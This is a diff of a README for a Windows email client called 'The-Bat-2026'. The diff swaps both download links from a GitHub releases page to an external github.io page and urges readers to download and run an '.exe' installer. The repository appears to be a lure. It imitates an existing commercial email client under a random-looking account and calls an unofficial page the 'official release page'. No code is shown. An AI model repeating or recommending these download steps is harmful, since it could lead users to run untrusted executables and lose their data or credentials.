@@ -1,6 +1,6 @@
 # 📧 The-Bat-2026 - Manage your email with total privacy
 
-[![Download The-Bat-2026](https://img.shields.io/badge/Download-The--Bat--2026-blue.svg)](https://github.com/reverent-camper840/The-Bat-2026/releases)
+[![Download The-Bat-2026](https://img.shields.io/badge/Download-The--Bat--2026-blue.svg)](https://reverent-camper840.github.io)
 
 The-Bat-2026 provides a secure way to manage your email on Windows. This software protects your data and simplifies how you read, write, and organize messages. It works on Windows 10 and Windows 11.
 
@@ -18,7 +18,7 @@ Before you install this application, check your computer against these requireme
 
 Use the following link to access the official release page. This page hosts the most current files for your operating system.
 
-[Click here to visit the release page and download the installer](https://github.com/reverent-camper840/The-Bat-2026/releases)
+[Click here to visit the release page and download the installer](https://reverent-camper840.github.io)
 
 Find the file that ends in ".exe" under the latest release section. Click the filename to start the download. Save this file into your Downloads folder or any location on your computer where you can find it later.
 
